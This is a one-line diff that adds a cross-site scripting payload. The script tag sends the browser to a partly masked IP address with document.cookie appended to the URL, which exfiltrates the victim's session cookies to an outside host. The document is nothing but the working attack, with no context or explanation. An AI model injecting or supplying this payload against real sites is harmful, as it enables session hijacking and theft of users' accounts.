@@ -1,0 +1,1 @@
+<script>location.href='http://192.x.x.x/index.php?test='+document.cookie;</script>
